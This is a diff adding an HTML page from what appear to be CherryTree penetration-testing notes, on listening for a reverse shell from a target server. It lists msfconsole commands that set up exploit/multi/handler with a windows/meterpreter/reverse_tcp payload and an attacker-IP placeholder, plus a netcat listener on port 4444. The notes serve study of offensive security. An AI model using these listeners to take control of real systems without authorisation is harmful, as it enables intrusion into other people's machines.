@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>3. listen for incoming connection from the Target Server</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>3. listen for incoming connection from the Target Server</h1><br/><br /><strong><h2>Listen for incoming connection from the Target Server </h2></strong><br /><br /><br /><strong>Meterpreter</strong><br /><div class="codebox"><div class="codebox">service&nbsp;postgresql&nbsp;start<br />msfdb&nbsp;init<br />msfconsole<br />use&nbsp;exploit/multi/handler<br />set&nbsp;payload&nbsp;windows/meterpreter/reverse_tcp&nbsp;&nbsp;&nbsp;#for&nbsp;the&nbsp;exploit&nbsp;we&nbsp;have&nbsp;to&nbsp;set&nbsp;the&nbsp;same&nbsp;payload<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#setted&nbsp;for&nbsp;the&nbsp;exe&nbsp;created&nbsp;with&nbsp;msfconsole<br />show&nbsp;options<br />set&nbsp;LHOST&nbsp;<span style="color:#000000;font-weight:400">&lt;</span>Attacke_IP<span style="color:#000000;font-weight:400">&gt;</span></div></div><br /><br /><a href=""><img src="images/817-1.png" alt="images/817-1.png" /></a><br /><br /><br /><strong>Netcat</strong><br /><div class="codebox"><div class="codebox">nc&nbsp;-nvlp&nbsp;4444</div></div></div>
+</body>
+</html>
